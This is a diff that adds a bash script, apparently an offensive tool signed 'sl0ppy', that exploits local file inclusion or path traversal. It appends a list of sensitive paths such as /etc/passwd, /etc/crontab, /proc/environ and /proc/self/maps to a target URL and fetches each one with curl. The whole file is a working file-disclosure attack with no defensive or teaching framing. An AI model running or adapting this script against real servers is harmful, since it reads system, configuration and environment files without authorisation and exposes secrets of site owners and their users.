@@ -1,0 +1,17 @@
+#!/bin/bash
+
+red='\e[31m'
+green='\e[32m'
+yellow='\e[33m'
+white='\e[97m'
+
+url="$1"
+files=("/etc/passwd" "/etc/crontab" "/etc/issue" "/etc/resolv.conf" "/etc/hostname" "/etc/anacrontab" "/proc/version" "/proc/numa_maps" "/proc/stack" "/proc/personality" "/proc/sessionid" "/proc/loginuid" "/proc/maps" "/proc/mountinfo" "/proc/pagemap" "/proc/uid_map" "/proc/stat" "/proc/schedstat" "/proc/meminfo" "/proc/mounts" "/proc/mountstats" "/proc/status" "/proc/environ" "/proc/sched" "/proc/cgroup" "/proc/schedstat" "/proc/patch-state" "/proc/modules" "/proc/self/version" "/proc/self/stat" "/proc/self/mounts" "/proc/self/mountstats" "/proc/self/status" "/proc/self/cgoup" "/proc/self/shed" "/proc/self/schedstat" "/proc/self/modules" "/proc/self/maps")
+for filename in ${files[@]};do
+  echo
+  #echo " {sl0ppy}----$filename----{sl0ppy}"
+  echo -e " $green{ $red sl0ppy $green} $white----$yellow $filename $white----$green{ $red sl0ppy $green}"$white
+  curl --silent "$url$filename"
+  echo
+  echo -e " $green{ $red sl0ppy $green} $white------$red Sl0ppyr00t $white----------$green{ $red sl0ppy $green}"
+done
